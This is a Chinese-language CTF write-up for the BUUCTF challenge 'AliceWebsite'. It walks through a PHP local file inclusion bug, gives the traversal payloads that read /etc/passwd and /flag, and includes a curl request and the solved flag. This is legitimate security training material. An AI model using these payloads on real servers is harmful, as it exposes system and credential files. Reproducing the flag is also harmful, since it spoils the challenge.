---
title: "[网鼎杯 2020 半决赛]AliceWebsite"
platform: BUUCTF
category: Web
difficulty: 入门
tags: [file-inclusion, lfi, directory-traversal]
vulnerability: 本地文件包含漏洞（LFI），action 参数未过滤导致可读取任意文件
solved: true
flag: "flag{55e2cf49-8cc2-4a7b-91f3-9de79bc7f354}"
---

# [网鼎杯 2020 半决赛]AliceWebsite

## 题目概述
一个简单的 PHP 网站，包含 Home 和 About 两个页面，通过 `action` 参数进行页面切换。

## 信息收集
访问首页，观察 URL 结构：
```
index.php?action=home.php
index.php?action=about.php
```

页面源码显示导航链接使用 `action` 参数包含不同的 PHP 文件，典型的文件包含模式。

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：本地文件包含（Local File Inclusion, LFI）

**原理**：PHP 代码使用 `include` 或 `require` 等函数包含用户传入的文件路径，但未对输入进行过滤和校验，导致攻击者可以通过目录穿越读取服务器上的任意文件。

**判断过程**：
1. 观察 URL 参数 `action=home.php`，猜测后端代码类似 `include $_GET['action']`
2. 尝试目录穿越读取 `/etc/passwd`：`action=../../../etc/passwd`
3. 成功返回 passwd 内容，确认存在 LFI 漏洞

## 利用过程（Payload + Flag）

**Payload 1 - 验证漏洞**：
```
index.php?action=../../../etc/passwd
```
成功读取 `/etc/passwd`，确认漏洞存在。

**Payload 2 - 获取 Flag**：
```
index.php?action=/flag
```
或
```
index.php?action=../../../flag
```

**完整请求**：
```bash
curl -s "http://target/index.php?action=/flag"
```

**返回结果**：
```
flag{55e2cf49-8cc2-4a7b-91f3-9de79bc7f354}
```

## 复现步骤
1. 访问题目首页，发现 `action` 参数控制页面包含
2. 构造 Payload `?action=../../../etc/passwd` 验证 LFI 漏洞
3. 尝试读取 `/flag` 文件：`?action=/flag`
4. 获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| LFI | action 参数 | `?action=/flag` 或 `?action=../../../flag` | PHP 文件包含、目录穿越 |

## 知识总结（解题技巧、同类题型套路）

1. **识别文件包含特征**：URL 中出现 `?page=xxx`、`?file=xxx`、`?action=xxx` 等参数时，优先测试 LFI
2. **验证方法**：先尝试读取 `/etc/passwd` 或 `/etc/hosts` 等已知存在的系统文件
3. **Flag 位置**：CTF 中 flag 常见位置有 `/flag`、`/flag.txt`、`/var/www/html/flag.php` 等
4. **路径技巧**：相对路径（`../../../flag`）和绝对路径（`/flag`）都值得尝试
